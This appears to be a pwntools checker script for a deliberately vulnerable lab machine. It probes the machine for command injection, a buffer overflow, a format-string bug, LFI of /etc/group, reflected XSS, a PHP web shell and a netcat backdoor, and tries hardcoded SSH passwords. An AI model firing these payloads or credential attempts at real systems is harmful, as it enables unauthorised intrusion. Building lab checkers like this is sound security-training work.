#!/usr/bin/python

from pwn import *
import re

class test_vulns():
    def test_cmd_injection(self, ip):
        """
        Test for command injection on port 2222
        @param ip: ip address of target
        """
        try:
            conn = remote(ip, 2222)
            prompt = conn.recv()
            log.debug(prompt)
            conn.send("ls;ls /home/\n")
            results = conn.recv()
        except:
            log.info("Error connecting to "+ ip)
            return False
        log.debug(results)
        conn.close()
        if "jackbauer" in results:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False


    def test_buffer_overflow(self, ip):
        """
        Test buffer overflow by sending a lot of A characters and checking for a segfault (ie. signal -11).
        Buffer overflow service is running on port 3333
        @param ip: ip address of target
        """
        try:
            conn = remote(ip, 3333)
            prompt = conn.recv()
            log.debug(prompt)
            overflow_string = "A"*600 + "\n"
            conn.send(overflow_string)
            results = ""
            results = conn.recv()
        except:
            log.info("Error connecting to"+ ip)
            return False
        conn.close()
        log.debug(results)
        if "-11" in results:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False


    def test_ssh_default(self, ip, username, pw):
        """
        @param ip: ip address of target
        @param username: ssh username
        @oaram pw: password
        """
        try:
            shell = ssh(username, ip, password=pw)
            results = ""
            results = shell["whoami"]
        except:
            log.info("Failed to connect to " + ip)
            return False
        log.debug(results)
        shell.close()
        if username in results:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False

    def test_backdoor_1(self, ip):
        """
        Test netcat backdoor. Default backdoor is on port 33123
        but the backdoor port will decrement after each successful connection
        @param ip: ip address of target
        """
        for i in range(33123, 33103, -1):
            port = i
            try:
                conn = remote(ip, port)
                results = ""
                if conn:
                    conn.send("ls /home/\n")
                    results = conn.recv()
                    conn.close()
                if "jackbauer" in results:
                    log.info(ip+" VULNERABLE")
                    return True
            except:
                pass

    def test_backdoor_2(self, ip):
        """
        Test the php backdoor that was left on the machine in the images folder
        @param ip: ip address of target
        """
        url = "http://" + ip + "/arbitrary_file_upload/images/shell.php?cmd=whoami"
        results = ""
        try:
            results = wget(url)
        except:
            print("Error")
            return False
        print(results)
        if "www-data" in results:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False

    def test_lfi(self, ip):
        """
        Test local file inclusion vulnerability. This can be checked by giving a full path
        and without using ../
        @param ip: ip address of target
        """
        url = "http://" + ip + "/lfi/lfi.php?language=/etc/group"
        try:
            results = wget(url)
        except:
            log.info("Error performing web request to ")
            return False
        print(results)
        if "surnow" in results:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False

    def test_local_format_string(self, ip, username, pw):
        """
        Test for local format string vulnerability. This can be accessed by jackbauer, chloe, and surnow.
        To verify this vulnerability we can check to see if we can read data off of the stack
        @param ip: ip address of target
        @param username: username to login with over ssh
        @param pw: password to login with over ssh
        """
        try:
            shell = ssh(username, ip, password=pw)
        except:
            print("Failed to Connect")
            return False
        results = ""
        results = shell["/home/jackbauer/services/c/formatme_local/printf %x%x%x"]
        evaluation = re.match("[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
        print(results)
        shell.close()
        if evaluation:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False

    def test_reflected_xss(self, ip):
        """
        Test for reflected cross-site scripting (XSS)
        @param ip: ip address of target
        """
        url = "http://" + ip + "/xss/xss.php?quote=<img%20src=x%20onerror=alert(1)>"
        results = ""
        try:
            results = wget(url)
        except:
            print("Error")
            return False
        print(results)
        if "<img src=x onerror=alert(1)>" in results:
            log.info(ip+" VULNERABLE")
            return True
        else:
            log.info(ip+" NOT VULNERABLE")
            return False

    def test_dom_based_xss(self, ip):
        print("need to implement")

    def test_arbitrary_file_upload(self, ip):
        print("need to implement")

    def test_ssh_jackbauer(self, ip):
        return self.test_ssh_default(ip, "jackbauer", "devgru6")

    def test_ssh_chloe(self, ip):
        return self.test_ssh_default(ip, "chloe", "chloechloe")

    def test_ssh_surnow(self, ip):
        return self.test_ssh_default(ip, "surnow", "surnowsurnow")

    def check_service(self, ip):
        return True


if __name__ == "__main__":
    ip_addr = "192.168.0.30"
    t = test_vulns()
    t.test_cmd_injection(ip_addr)
    t.test_buffer_overflow(ip_addr)
    t.test_ssh_jackbauer(ip_addr)
    t.test_ssh_chloe(ip_addr)
    t.test_ssh_surnow(ip_addr)
    t.test_backdoor_1(ip_addr)
    t.test_lfi(ip_addr)
    t.test_local_format_string(ip_addr, "chloe", "chloechloe")
    t.test_reflected_xss(ip_addr)


